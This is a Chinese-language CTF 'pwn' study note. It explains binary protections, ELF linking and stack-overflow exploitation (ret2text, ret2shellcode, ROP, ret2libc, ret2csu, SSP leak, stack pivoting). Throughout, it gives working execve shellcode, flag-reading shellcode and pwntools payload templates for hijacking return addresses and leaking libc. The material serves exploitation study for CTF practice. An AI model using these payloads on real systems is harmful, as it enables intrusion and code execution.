#!/usr/local/bin/python 
or
#!/usr/bin/env python
```

**调试器**

```Bash
python -m ipdb x.py
# l: 显示所有代码  s: 单步调试  restart: 重启  c: 继续  q: 退出 b num: 下断点到 num 行
# p variable # 查看变量值  p locals() # 返回所有值的字典
```

**检测器**

```Bash
pyflakes <file.py> # 可以检查错误
mypy <file.py> # 静态类型检查器
```

**性能分析**

```Bash
python -m cProfile -s tottime command.py # 使用cProfile分析, 总时间进行排序
python -m memory_profiler x.py # 查看代码内存使用情况
```

**字节串**

```Bash
s.replace(b'a', b'c') # 字节串替换 a 替换为 c
str_s.decode('utf-8').strip('x') # 字节串转换为字符串, 并去除两端的'x'
eval(s_str) # 执行字符串中的运算式
```

### Makefile

**变量定义**

```Makefile
%            # 通配符

$@           # 目标
$<           # 所有目标依赖
$^           # 目标依赖列表中第一个依赖
$?           # 所有目标依赖中被修改过的文件
$*           # 当前目标中的 % 部分
$(object)    # 使用object变量
```

**举例**

```Makefile
<targets ...>: <prereq ...> # targets 依赖于 prereq, 若prereq改变, targets也得重新生成
    command # 命令生成 targets
.PHONY: all clean
# 定义的伪目标一定会被执行

PWD := $(shell pwd) # 获取相对路径必须在pwd前加shell
TARGET := $(foreach <var>, <list>, <text>) # <list>中逐一取出到<var>, 执行<text>表达式

all:
    <targets ...>: <target-pattern>: <prereq-patterns ...>
    #targets: 目标文件, 即最终输出文件
    #target-pattern: targets的模式，目标集模式，%表示匹配任意文件名
    #prereq-patterns: 目标的“依赖”元素
clean:
    @-rm $(DIR_TARGET)*
    #@表示不回显命令，-表示忽略错误，不中断makefile执行，*是通配符，表示匹配目录下的所有文件
```

### 保护措施

#### The NX bits

No-eXecute，编译时决定是否生效，操作系统实现，在内存页的标识中增加“执行”位，可表示该内存页是否可以执行——无法向栈写shellcode，栈不可执行，可利用ROP绕过

#### ASLR

Address Space Layout Randomization：地址空间分布随机化，影响ELF的加载地址，但前提是ELF开PIE

程序装载时生效

- `/proc/sys/kernel/randomize_va_space = 0`：无随机化
- `/proc/sys/kernel/randomize_va_space = 1`：部分随机化，**共享库、栈、mmap()、VDSO**随机化
- `/proc/sys/kernel/randomize_va_space = 2`：完全随机化，部分随机化基础上，通过**brk()**分配的堆内存空间也随机化

会在For Kernel下开始偏移随机的量，使得栈的起始地址随机

#### PIE

position-independent executable，地址无关可执行，不开则加载到固定位置

- 针对**代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）**等固定地址的一个防护技术
- 开启PIE保护，每次加载程序时都**变换加载地址，使text、bss、data地址随机化**

在IDA中会发现地址均为偏移地址，于是不能通过ROPgadget帮助解题

绕过：部分写地址，利用栈上已有的地址，只修改最后两个字节，因为地址最后三个数字就是实际地址的最后三个数字

#### Canary

有canary栈溢出无法执行，在函数入口处从fs(32位)/gs(64位)寄存器读取一个值

| return address |                     |
| -------------- | ------------------- |
| previous ebp   | ebp                 |
| canary         | 执行ret前检查canary |
|                |                     |
| s              | esp                 |
|                |                     |

若Canary值被改变，则会触发：`__stack_chk_fail` 函数

#### RELRO

（Relocation Read Only：重定位表（即.got和.plt表）只读）

No relro：got表可写，（`init.array`、`fini.array`、`got.plt`均可读可写）

部分relro：got表可写，（`ini.array`、`fini.array`可读不可写，`got.plt`可读可写）

完全relro：got表不可写，只读，无法被覆盖，大大增加程序启动时间（均不可读不可写）

#### RWX

checksec查看**可读可写可执行**的区域：Has RWX segments

## ELF文件

Executable and Linking Format 可执行和链接的格式

|         |      | 可执行程序 | 动态链接库 | 静态链接库 |
| ------- | ---- | ---------- | ---------- | ---------- |
| Windows | PE   | .exe       | .dll       | .lib       |
| Linux   | ELF  | .out       | .so        | .a         |

![img](/img/pwn_note.zh-cn.assets/-17284429785727.assets)

![img](/img/pwn_note.zh-cn.assets/-17284429785738.assets)

![img](/img/pwn_note.zh-cn.assets/-17284429785739.assets)

![img](/img/pwn_note.zh-cn.assets/-172844297857310.assets)

![img](/img/pwn_note.zh-cn.assets/-172844297857311.assets)

 **段（segment）与节（section）**

1. 段用于进程的内存区域的rwx权限划分
2. 节用于ELF文件编译链接时与在磁盘上存储时的文件结构的组织

- 代码段 Text Segment 包含函数代码与只读数据
  - .text节：
  - .rodata节：read only只读数据节
  - .hash节
  - .dynsym节
  - .dynstr节
  - .plt节
  - .rel.got节
- 数据段 Data Segment 包含可读可写数据
  - .data节：已初始化的全局变量
  - .dynamic节
  - .got节
  - .got.plt节
  - .bss节：（Block Started by Symbol）未初始化的全局变量，不占用实际内存空间
- 栈段 Stack Segment
  - 局部变量，指针

三个ELF表：

1. **PLT（Procedure Linkage Table）:**
   1. `elf.plt['system']` 通常是用于调用共享库中的函数的入口点。PLT 中的代码负责将控制转移到真正的函数地址，这是通过动态链接的方式实现的。因此，PLT 中的地址是一个入口点，负责实际跳转到共享库中的函数。
   1. 调用外部函数的一组跳转表，每个函数对应一个入口，包含可执行代码，覆盖返回地址为plt地址可最终跳转导向到got表中的函数地址处
2. **Symbol Table:**
   1. `elf.symbols['system']` 返回的是 ELF 文件中符号表中 `system` 函数的地址。这个地址是在编译时确定的，是链接时的静态地址。在编译时，链接器会将符号解析为实际的地址。
3. **GOT（Global Offset Table）:**
   1. `elf.got['system']` 返回的是 ELF 文件中的 GOT 表中 `system` 函数的入口地址。全局表存储外部函数或库函数真实地址，GOT 表中的地址是一个指针，指向共享库/动态链接器中的真实函数地址。在运行时，当程序第一次调用一个共享库中的函数时，PLT 中的代码会更新 GOT 表中的地址，将其设置为实际函数的地址
   1. 不用于直接调用，只保存了实际函数地址，不是可执行的指令，覆盖返回地址不用got表地址覆盖

### **进程执行**

静态链接

![img](/img/pwn_note.zh-cn.assets/-172844297857412.assets)

动态链接

![img](/img/pwn_note.zh-cn.assets/-172844297857413.assets)

![img](/img/pwn_note.zh-cn.assets/-172844297857414.assets)

![img](/img/pwn_note.zh-cn.assets/-172844297857415.assets)

- .dynamic：**保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等**。
- .got（Global Offset Table，全局偏移表）：保存全局变量/外部符号地址
- .got.plt（.plt的GOT全局偏移表）：保存全局函数真实地址
  - 如果在之前查找过该符号，内容为外部函数的具体地址
  - 如果没查找过, 则内容为跳转回.plt的代码, 并执行查找
- .plt（Procedure Linkage Table, 进程链接表）：包含一些代码
  - 调用链接器来解析某个外部函数的地址, 并填充到.got.plt中, 然后跳转到该函数
  - 直接在.got.plt中查找并跳转到对应外部函数(如果已经填充过)

**动态链接过程**

1. .text节中，调用 libc 动态链接库 中的 foo 函数`call foo@plt`；然后去代码段中的.plt节（plt表中每一项都是一个调用函数的表项）
2. 进程首次调用foo函数：
   1. 跳转到`.plt`中的foo表项，`.plt`中的代码立即跳转到`.got.plt`中记录的地址【`jmp *(foo@GOT`】，若`.got.plt`还未解析该函数地址，存的是`.plt`的对应函数的地址【foo@plt+"1"/6】，所以会跳回到`.plt`中
   2. 执行`push index` 和 `jmp PLT0`，index是foo在plt表中对应的索引
   3. 跳转到PLT0后执行`push *(GOT+4)` （表示用到哪个动态链接库）和 `jmp *(GOT+8)`（进入`dl_runtime_resolve`函数解析foo函数实际地址填入`.got.plt`中）
3. 进程再次调用foo函数：
   1. 跳转到`.plt`中的foo表项，跳转到`.got.plt`，并直接从`.got.plt`跳转到foo的真实地址

## 终端处理

只有`echo`命令

```Bash
echo `</flag` # 将``包裹的子命令 /flag 内容输出到 echo 中读出
```

## 随机数

**random**

```C
time_t timer;
struct tm *v3;
int secret;

timer = time(0LL); // 当前时间
v3 = localtime(&timer);
srandom(v3->tm_yday); // 设置种子 为tm结构中的yday

secret = random() // 种子数相同，多次得到的随机值相同
```

利用**当前时间戳**进行预测

```python
from ctypes import cdll
import time
clib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

seed = int(time.time())
clib.srand(seed)
pwd = clib.rand()
```

**/dev/random**

```C
// 基于物理设备噪声熵值 真随机 熵池不足会阻塞
random_file = fopen("/dev/random", "rb"); // 打开系统/dev/random设备
fread(&secret, 4uLL, 1uLL, random_file); // 读 1 个 4 字节的数据块，存入secret地址中
fclose(random_file); 
```

**arc4random**

```C
// 基于 ARC4（Alleged RC4） 加密算法实现高质量伪随机数 无符号32位随机整数 
// 操作系统中不显式初始化种子
secret = (unsigned int)arc4random() 
```

若有循环函数及**模数**可以进行**爆破**

```python
for i in range(num):
    num = i
    io.sendline(str(num))
    result = io.recvline()
    if b"xxx" in result:
        break
```



## 整数溢出漏洞

下标溢出（越界）：程序未规定上下界，数字溢出，导致可以访问线性地址上内容

## 栈溢出漏洞

### 栈基础

函数调用栈在内存中**从高地址向低地址生长**，所以栈顶对应内存地址压栈时变小，退栈时变大

![img](/img/pwn_note.zh-cn.assets/-17284464998305.assets)

- 紧邻 ebp 的【stack frame pointer】保存父进程/函数的 ebp 地址
- 子函数的参数保存在父函数栈帧末尾，返回地址前的 arguments 中

函数调用栈

ebp：存储当前函数状态的基地址

esp：存储函数调用栈的栈顶地址

eip：存储即将执行的程序指令的地址

![img](/img/pwn_note.zh-cn.assets/-17284464998291.assets)

上图中，arg1,2,3是Callee函数的参数，但在Caller函数栈帧中

函数开头及结尾

```Assembly
push ebp
mov ebp, esp
leave 
#等价于 mov esp, ebp    有局部变量的情况
#      pop ebp
retn
#等价于 pop eip，实际没有该指令
```

![img](/img/pwn_note.zh-cn.assets/-17284464998302.assets)

32位栈的**三层嵌套**调用演示：

![image-20241013134352978](/img/pwn_note.zh-cn.assets/image-20241013134352978.png)

**注：**当局部变量是数组`v[2]`时，索引低的`v[0]`靠近rsp，地址更低，索引高的`v[1]`靠近rbp，地址更高

**压栈**

1. 被调用函数参数**逆序**压入栈内，esp→（arg1, arg2,...,argn）
2. 将**调用函数进行调用之后的下一条指令地址**作为**返回地址**压入栈内，即**调用函数**的 **eip** 信息得以保存
   1. （call xxx）
3. 将当前的ebp的值（调用函数的基地址）压入栈内，将**ebp寄存器值**更新为**当前栈顶的地址**，即ebp更新为被调用函数的基地址
4. 被调用函数的局部变量压入栈内，只 esp 动

**出栈**

1. 被调用函数局部变量栈内弹出，栈顶esp指向被调用函数的基地址ebp
2. 基地址内存储的调用函数的基地址从栈内弹出到ebp寄存器中，调用函数的ebp得以恢复，栈顶esp指向返回地址

**x86**

- 栈传递参数
- eax存放返回值

**amd64**

- 前6个参数存于：**rdi、rsi、rdx、rcx、r8、r9**
- 第7个以后参数存于栈中

**read泄露栈地址**

无canary时，下述代码泄露栈地址

```C
char buf[48]; // [rsp+0h] [rbp-30h] BYREF
read(0, buf, 0x40uLL); // 末尾不为0则打印出后续内容
printf("%s", buf);
```

构造`payload=b'a'*0x30`，接收48个a后会泄露出后续栈地址内容



### shellcode

```Bash
gcc -c start.s -o start.o
ld -e _start -z noexecstack start.o -o start
```

纯汇编

```Assembly
.intel_syntax noprefix
.text
.globl _start
.type _start, @function

_start:
    xxx
    xxx
```

### ret2text

- 退栈过程，返回地址会传给eip，让溢出数据用攻击指令的地址覆盖返回地址
- 攻击指令的地址一般为用户中存在的后门函数地址，即已存在
- （考虑最简单情况canary并未保护，则stack frame pointer和局部变量之间没有canary的随机值）

```C
setbuf(stdin, 0);
setbuf(stdout, 0);
//用于将输入输出缓冲区关闭，直接输出到屏幕输入到相应位置

setbuf(bss_start, 0); // 禁用 bss_start 文件流处的缓冲区, 每次读写立即系统调用
```

**32位覆盖**返回地址

```python
payload = b'a'*padding + p32(execve_plt_addr) + p32(ret_addr) + p32(arg1) + p32(arg2) + p32(arg3)
# arg1:/bin/sh_addr
# arg2:argv[] = 0
# arg3:envp[] = 0
# ret_addr可随意填写, 指代execve函数执行后的返回地址
```

**漏洞点**

```C
char buffer[8]; // [esp+8h] [ebp-10h]    距离ebp 16字节， 距离esp 8字节
//8字节的缓冲区                           一般关键是ebp
gets(buffer);
```

覆盖完缓冲区16字节，然后覆盖ebp的值4字节，最后覆盖返回地址

```Bash
payload = b'A' * 16 + b'BBBB' + p32(0x8048522)
#直接存在的后门函数可以使用elf.symbols['函数名']
```

若为64位，可能会遇到RSP 16字节对齐问题，可以使用两种方法来达成目的

1. 将后门函数地址+1来跳过`push rbp`调整rsp栈帧，前提是后门函数第一个指令为`push rbp`，指令长度1字节
2. 在后门函数地址前加入`ret`指令地址调整rsp栈帧

### ret2shellcode

若可以在栈上

```C
char buf; // [esp+0h] [ebp-88h]
read(0, &buf, 0x100u);    
((void)buf)(arg1); // 执行shellcode
payload = shellcode + b'\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)
# buf_addr为题目所返回
# \x90: Nop
```

- 篡改返回地址为手动传入的shellcode所在缓冲区地址，先将shellcode写入栈缓冲区
- （由于the NX bits保护措施，栈缓冲区不可执行，改为**向bss缓冲区（默认可执行）**或**向堆缓冲区**写入shellcode并使用**mprotect**赋予其可执行权限）

```C
mprotect(&GLOBAL_OFFSET_TABLE_, size, 7); 
// 将全局偏移表所在的size大小的内存区域的权限设置为可读、可写和可执行
```

![img](/img/pwn_note.zh-cn.assets/-17284464998303.assets)

```C
char s; // [esp+1Ch] [ebp-64h]

gets(&s);
strncpy(buf2, &s, 0x64u); //buf2为未初始化的全局变量，在bss中
//复制字符串，从s指向的地址复制0x64u的字符数到buf2中
```

| return address 0x4 |      |
| ------------------ | ---- |
| previous ebp 0x4   | ebp  |
| s 0x64             |      |
|                    | esp  |

而IDA有的时候不可靠，需要依靠gdb动态调试判断真实的buf与ebp之间的距离

构造的payload使用gets函数覆盖s，ebp和返回地址，返回地址覆盖为shellcode地址，shellcode由strncpy函数从s中复制到bss段中的buf2中；于是返回地址覆盖为buf2中shellcode地址。

输入同样的exp后执行失败，由于高版本linux中程序bss段不再可执行导致出错，查看方法：

gdb中vmmap找到对应的bss段，buf2地址为0x804a080，所以

![img](/img/pwn_note.zh-cn.assets/-17284464998304.assets)

可以在 **[shellcode数据库](https://shell-storm.org/shellcode/index.html)** 寻找适合的shellcode

23字节shellcode：

```C
\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
xor esi, esi               ; 将寄存器 esi 清零                      \x31\xf6
mov rbx, 0x68732f2f6e69622f ; 将字符串 "/bin//sh" 存入寄存器 rbx     
push 0x54                  ; 将字符串 "/bin//sh" 压入栈中
push 0x53                  ;                                       \x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
push rbx                   ; 将字符串 "/bin//sh" 压入栈中            \x56\x53\x54
pop rdi                    ; 将栈顶元素弹出并存入寄存器 rdi           \x5f
push 0x3b                  ; 将系统调用号（sys_execve）压入栈中       \x6a\x3b
pop rax                    ; 将栈顶元素弹出并存入寄存器 rax           \x58
xor edx, edx               ; 将寄存器 edx 清零                       \x31\xd2
syscall                    ; 执行系统调用                            \x0f\x05
```

**当前方执行完read函数就执行shellcode，且此时输入极少**

```c
read(0, (void *)0x20240000, 0xDuLL);
	mov     edx, 0Dh        ; nbytes
	mov     esi, 20240000h  ; buf
	mov     edi, 0          ; fd
	call    _read
MEMORY[0xdead]();
	... // esi和edi未被改变
	call    rdx
```

可以输入以下绕过：

```python
bypass = asm("""
	mov rdx, 0x1000
	syscall ; 再次read系统调用再送入一次shellcode执行	
""")
```

**Open syscall shellcode**

```Python
# open调用 21字节 ret会进入0x67616c66出错
context(arch="amd64")
shellcode = asm("""
    mov rdi, 0x67616c66     /* 'flag'*/
    push rdi
    mov rdi, rsp
    xor esi, esi            /* O_RDONLY = 0 */
    mov eax, 0x2
    syscall
    ret 
""")

# open调用 21字节 ret 会返回源程序
shellcode2 = asm("""
    lea rdi, [rip+flag]
    xor esi, esi            /* O_RDONLY = 0 */
    mov eax, 0x2            /* open syscall */
    syscall
    ret                     /* 为了返回源程序 */
flag: .ascii "flag"
    
""") # 使用该情况要注意shellcode前后影响因素，flag后加入b'\x00'及前方加入b'\x90'(nop)
```

**ORW**

```python
addr = 0xdead
flag_addr = addr + 0x100 # flag硬写入内存中

shellcode = f"""
    mov rax, 2
    mov rdi, {flag_addr}
    mov rsi, 0
    syscall
    
    xor rax, rax
    mov rdi, 3
    mov rsi, {flag_addr}
    mov rdx, 0x40
    syscall
    
    mov rax, 1
    mov rdi, 1
    syscall
"""
pay = b'\x90'*0x10 + asm(shellcode) # 第二次读需要重新覆盖前面0x10地址
payload = pay.ljust(0x100, b'\x90') + b'/flag\x00\x00\x00' 
# 可能需要gdb微调在前后加\x00或\x90使刚好对应地址读取flag而不是flagxx
```



## ROP

**Return Oriented Programming——返回导向编程：适用于NX 开启情况**

amd64：构造覆盖栈

| system                                 |
| -------------------------------------- |
| /bin/sh                                |
| pop_rdi_ret（previous return address） |

解析：ret时即(pop eip)此时栈顶为/bin/sh，执行pop rdi，/bin/sh进入rdi，继续ret到system执行函数。

一些技巧：

1. pop rdi 的机器码是 5f c3，然而 pop r15 的机器码是 41 5f c3，且一般pop r15之后一般都是紧跟ret指令，

所以可以使用pop r15指令的后半部分，即 5f （pop rdi）

### ret2syscall

**x86** 通过 `int 0x80` 指令系统调用，**amd64** 通过 `syscall` 指令系统调用

```Assembly
# x86 
mov eax, 0xb            ;系统调用号
mov ebx, ["/bin/sh"]    ;参数
mov ecx, 0
mov edx, 0
int 0x80                ;中断号
# <==> execve("/bin/sh", NULL, NULL)
```

![img](/img/pwn_note.zh-cn.assets/-172844664600911.assets)

存在大量的 `pop xxx; ret`的指令，使得拼接这些gadget为payload

- 覆盖返回地址后运行到ret（pop eip），即将栈顶元素的值（指向gadget的地址）给eip，此时eip指向了gadget并执行gadget的内容（pop; ret），此时的pop仍然将栈上的值弹出，此时的栈为给指定的寄存器存入值，然后ret继续下一步操作，在Text段中的gadget中连续跳转，最终调用system call
- 可以找libc中的gadget（需要泄露libc基地址）；也可以找程序中的gadget

![img](/img/pwn_note.zh-cn.assets/-172844664601012.assets)

![img](/img/pwn_note.zh-cn.assets/-172844664601013.assets)

栈：

| int 0x80 address                               |
| ---------------------------------------------- |
| /bin/sh address                                |
| 0                                              |
| 0                                              |
| pop_edx_ecx_edx_ret address                    |
| 0xb                                            |
| pop_eax_ret address     (previous ret address) |

```Python
#使用 flat 函数来构造 ROP字节流  payload
payload = flat([ b'A'*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_ret ])
# flat([gadget1, gadget2, gadget3])
```

若system传入的参数一定包括其他数据则可以填写"||sh"使得执行`system("xxxx||sh")`

若通过ROP使用读flag操作，即

```C
read(0,free_hook,4)    //需要输入flag，替代free_hook地址
//栈：pop_rdi_ret 0 pop_rsi_ret free_hook_addr pop_rdx_ret 4 read_addr
open(free_hook,0)      //打开flag
read(3,free_hook,100)  //读flag
puts(free_hook)        //输出flag
```

读flag到某个地方

1. `libc.['environ']`，是libc存储的栈地址
2. libc的`bss`段，将libc放入IDA中查看即可
3. `__free_hook `，__free_hook是全局变量，可以直接被修改

**64位**

构造栈：使用**linux系统调用**

| syscall address                                |
| ---------------------------------------------- |
| 0                                              |
| 0                                              |
| pop_rsi_rdx_ret address                        |
| /bin/sh address                                |
| pop_rdi_ret address                            |
| 0x3b (execve调用号)                            |
| pop_rax_ret address     (previous ret address) |

**system无`/bin/sh`可以通过栈溢出构造出read，将/bin/sh写入到bss段中，再system(bss_addr)**

```Bash
elf = ELF("./pwn")
read_addr = elf.plt['read']

# 构造利用链
# read(0, bss_addr, 0x10)
payload = b'a'*padding + b'b'*ebp_padding
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(bss_addr)
payload += p64(pop_rsi_ret) + p64(0x10)
payload += p64(read_addr)

# system(bss)
payload += p64(pop_rdi_ret) + p64(bss) + p64(system)

io.send(payload)
io.send("/bin/sh") # read函数读入到bss
```

**memcpy绕过**

计算机中用补码存储有符号数，正数就是原码，负数需按位取反加一

```Python
_isoc99_scanf((unsigned int)"%d", (unsigned int)&size);
if ( size )
{
  if ( size > 16 )
    puts("Number out of range!");
  else
    memcpy(v, &buf, size); # memcpy中的size 为 size_t 
    # typedef unsigned long size_t; 即无符号整数

}
```

调试发现**比较**代码为：

```Python
cmp eax, 10h # eax为32位 且此时将eax作为有符号整数看
```

**计组知识**

通过构造size为【作为有符号数是负数，作为无符号数为一个极大数】

| 输入        | rax                 | eax                        | 有符号比较      | 无符号复制 |              |
| ----------- | ------------------- | -------------------------- | --------------- | ---------- | ------------ |
| -1          | FFFF FFFF FFFF FFFF | FFFF FFFF                  | -1 < 16         |            | 绕过但崩溃   |
| -23923      | FFFF FFFF FFFF A28D | FFFF A28D                  | -23923 < 16     |            | 绕过getshell |
| 4294967200  | 0000 0000 FFFF FFA0 | FFFF FFA0                  | -96 < 16        |            | 绕过getshell |
| -2147483896 | FFFF FFFF 7FFF FF08 | 7FFF FF08(第一位为0表正数) | 2147483400 > 16 |            | 未绕过崩溃   |

**调试方法**

根据相应汇编看寄存器的变化值，然后逆向使用python进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的size大小，进而若有可控制的数组偏移如下，即可利用更改内存值

```C
__isoc99_scanf("%d", &v4);
read(0, *((void **)&record + v4), 0x80uLL);
```

### ret2libc

思路：篡改栈帧上自返回地址开始的一段区域为一系列gadget地址，最终调用libc中的函数获取shell

- 程序中存在system函数，plt中可找到
- **32位程序**传参是通过栈传参，用ROP在栈布置参数

![img](/img/pwn_note.zh-cn.assets/-172844664601114.assets)

32位构建栈：

| 0【exit的参数】                             |
| ------------------------------------------- |
| "/bin/sh" address【传给system的是其地址!!】 |
| exit()【0xdeadbeef任意一个地址】            |
| system@plt【previous return address】       |
|                                             |

也可以为更通用形式：

| "/bin/sh" | or     | "/bin/sh" |
| --------- | ------ | --------- |
| pop_ret   | BBBB   |           |
| system    | system |           |

`system@got → & system → system code`，ret的时候覆盖`& system`地址

由于服务器一定开启了ASLR，所以返回地址并不一定得覆盖为shellcode地址，因为不能确定所以需要使用【Nop滑梯】：

![img](/img/pwn_note.zh-cn.assets/-172844664601115.assets)

**解释为何`system`和`"/bin/sh"`以及`exit`和`0`要相隔1字节：（也是ROP链）**

- 返回地址覆盖为了`system`函数地址，通过 `ret` 即 `pop eip` 将`system`地址 pop 给`eip`寄存器，`eip`指向system函数
- 执行system函数开头汇编为`push ebp; mov ebp, esp`，所以先向栈中push了一个ebp，之后便是将局部变量local var压入栈中
- 如栈结构图所示
- 被调用函数一般寻找参数是从局部变量向上经过调用函数的ebp、返回地址后找参数arg1,2,3....，而此时刚好距离arg1——"/bin/sh"相差一个ebp和一个exit()函数，相隔2字节，即找到相应的参数
- 而之后exit()函数地址刚好为system原返回地址的位置，则继续同样操作达成ROP链利用

```C
char s;//    [esp+1Ch] [ebp-64h]

gets(&s);
```

![img](/img/pwn_note.zh-cn.assets/-172844664601116.assets)

```Python
elf = ELF("./ret2libc1")
bin_sh = next(elf.search(b"/bin/sh"))
system_plt = elf.plt["system"]

payload = b'A' * 112 + p32(system_plt) + b'B' * 4 + p32(bin_sh)
```

若无`"/bin/sh"`，

- 需要使用ROP来gets输入的/bin/sh写入程序中的缓冲区中，再调用system函数
- 或找程序或libc文件中是否有sh或/bin/sh

| buf = "/bin/sh" |
| --------------- |
| buf             |
| system@plt      |
| gets@plt        |
| aaaaaaaaaa      |

覆盖为get函数后，还需要手动输入"/bin/sh"最后会存储到buf中

```Python
io.send(b"/bin/sh\x00")
#加入\x00避免被阻塞7
```

若plt表存在system可以直接用，若不存在则无法直接使用，需要泄露出system函数的实际地址，**泄露主GOT，攻击主PLT**

泄露libc地址：

1. 通过其他的类似puts函数来泄露真实libc中puts的地址（`got`表地址），本地和远程libc版本可能不一样且由ASLR所以泄露地址必须**灵活**

**模板：若只有一次gets需要覆盖返回地址进行二次运行，回到main或vuln函数**

```Python
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload1 = b'a'* padding + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vul_addr)
libc_base = leak_puts_addr - libc.sym['puts']
```

1. 此时本地会存在libc文件，程序运行时，libc会被加载入内存的虚拟空间中，即使经过了映射，但函数之间的偏移是一样的
2. 无"/bin/sh"可以找任何一个字符串含有"sh"的字符

**获得shell的权限也可以通过利用`system($0)`实现，而`$0`在机器码中为`\x24\x30`**

```Python
elf = ELF("./xxx")
libc = ELF("./libc-2.23.so")#此处需要填入程序依赖链接的libc文件可能不一定是所写的这个

puts_addr = elf.got['puts']    
#已加载的puts代码地址，题目中会经过其返回给真正的puts在libc中地址，所以接收即可

libcBase = int(io.recvuntil(b"\n", drop = True), 16) - libc.symbols["puts"]
#int(xxx, 16) 将十六进制转换为整型；接受数据直到\n并将\n丢弃

# cyclic(60)快捷填充垃圾数据
payload = flat(cyclic(60), libcBase + libc.symbols["system"],
          0xdeadbeef, next(elf.search(b"sh\x00")))
```

程序不能返回puts在libc中的地址，则需要ROP来获取libc中的函数真实地址

- 一种方法是通过ROPgadget来达到系统调用write函数来输出got表puts函数地址
- 另一种方法是直接将已有的write@plt覆盖返回地址，然后传入参数输出got表puts函数地址

```Python
# 32位
payload = b'a'*pad + b'aaaa' + p32(elf.symols["write"]) + p32(new_retn_address) + p32(1) 
            + p32(elft.got["write"]) + p32(4) # 向标准输出写4个字节
# 获取泄露的地址
# hex(u32(b'\xaa\xbb\xcc\xdd'))来获取输出的十六进制地址

# 64位
payload = b'a'*pad + b'aaaaaaaa' + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_r15_ret_addr) +
           p64(write@got) + p64(0xdeadbeef) + p64(pop_rdx_ret_addr) + p(8) + p64(write@plt)
           + p64(new_retn_address)
           # 0xdeadbeef传给r15，r15是多余的
           # 8是给rdx的值，即写出一个字节
```

64位程序需要栈平衡

64位栈溢出+已知libc基址+system函数地址+binsh地址 构建

| system_address                    |
| --------------------------------- |
| bin_sh_address                    |
| pop_rdi_ret_address  覆盖返回地址 |
| padding=buf_size + 0x8(rbp)       |

【`pop rdi`地址跳转到`pop rdi`，执行`pop rdi`将`/bin/sh`字符串所在地址pop到rdi中，执行p`op rdi; ret`中的`ret`指令，跳转到`system`函数地址执行system函数】

```Python
payload = b'a'*padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
# 直接打入会发生段错误: 一般为指令 movaps xmmword ptr [rsp+0x50],xmm0
```

指令中表示rsp+0x50的地址需要与16字节对齐，16字节表示0x10，即此处的地址结尾应该为0而不是8，gdb查看：

```Assembly
pwndbg> p $rsp
$1 = (void *) 0x7ffeaf509298
pwndbg> p $rsp + 0x50
$2 = (void *) 0x7ffeaf5092e8
```

**解决**

为了对齐，只能让该地址加8或减8，且不影响payload的执行，`pop rdi`和`ret`，都让`rsp`的地址递增，因此考虑利用`ret`让`rsp`的地址继续加8

```Python
payload = b'a'*padding + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
# 可在libc中ROPgadget找, 通过偏移计算地址, 若开启PIE不可找IDA中程序ret指令, 因为位置无关程序
```

此处不能使用system_addr+1解决，system第一个指令是`endbr64`4字节而不是`push rbp`

```Assembly
Disassembly of section .plt.sec:

0000000000001050 <system@plt>:
    1050:        f3 0f 1e fa                  endbr64 
    1054:        f2 ff 25 75 2f 00 00         bnd jmp QWORD PTR [rip+0x2f75]        # 3fd0 <system@GLIBC_2.2.5>
    105b:        0f 1f 44 00 00               nop    DWORD PTR [rax+rax*1+0x0]
```

### ret2csu

amd64特有的一种利用手法

![img](/img/pwn_note.zh-cn.assets/-172844664601117.assets)

可以通过r13, r14, r15控制rdx, rsi, edi，**需要rbp和rbx比较时相等**

## 花式栈溢出

- **无main函数**

用IDA静态分析main的地址，在gdb中打该地址断点

### SSP Leak

**(Stack Smashing Protect)**

- **Canary保护机制**

栈溢出导致崩溃的包含Canary的结果：

在早期libc版本（libc-2.23.so及以前）中会泄露出一个地址：

```Bash
#未修复
*** stack smashing detected ***: ./smashes terminated

#修复了bug
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

低版本libc可以通过该泄露出的地址进行操作：canary检查不符合的时候引起程序终止时，会打印程序名，而程序名作为`arg[0]`，存在于`stack`上，故可以考虑覆盖`arg[0]`，实现泄露任意地址的数据

```C
//早期函数实现
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

gdb调试，应要覆盖数据为0x0的地址处，改为某个地址达成任意地址读

```Bash
print &__libc_argv[0]    #可以在gdb中找到地址！
49:0248│ r12     0x7fffffffdf68 —▸ 0x7fffffffe293 ◂— 0x736a2f656d6f682f ('/home/js')
4a:0250│         0x7fffffffdf70 ◂— 0x0
4b:0258│         0x7fffffffdf78 —▸ 0x7fffffffe2cc ◂— 'SHELL=/bin/bash'
```

IDA中也可分析、识别出

```C
unsigned __int64 v4;    // [rsp+108h] [rbp-20h]    

v4 = __readfsqword(0x28u);//表示在栈上放置一个Canary，可能并不固定

//检查
return __readfsqword(0x28u) ^ v4;//为0才会通过检查
```

### **栈迁移**

**Stack Pivoting**

- 溢出的距离短覆盖不到返回地址
- 距离短，覆盖了返回地址无法继续构造ROP链
- 需要二次ROP

**"pop ebp ret" + "leave ret"**

